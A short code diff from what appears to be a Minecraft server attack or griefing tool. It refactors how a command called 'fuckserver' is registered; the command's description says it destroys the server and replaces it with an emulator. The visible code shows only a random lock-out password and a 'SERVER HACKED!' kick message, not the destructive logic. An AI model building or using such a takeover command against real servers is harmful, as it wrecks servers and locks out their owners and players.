@@ -27,6 +27,7 @@ import java.util.ArrayList;
 import java.util.Objects;
 import java.util.Random;
 
+@Command.Info(command = "fuckserver", description = "Destroys the server and replaces it with an emulator.", category = CommandCategory.Server)
 public class FuckServer extends Command {
     private String kickReason;
     private String password;
@@ -34,7 +35,6 @@ public class FuckServer extends Command {
 
     @SuppressWarnings("StringConcatenationInLoop")
     public FuckServer() {
-        super("fuckserver", "Destroys the server and replaces it with an emulator.", CommandCategory.Server);
         password = RandomStringUtils.randomAlphanumeric(243);
         for (int i = 0; i < 100; i++)
             kickReason += ChatColor.DARK_RED + "§kAAAAAAAA" + ChatColor.RESET + ChatColor.RED + "SERVER HACKED!" + ChatColor.DARK_RED + "§kAAAAAAAA\n";
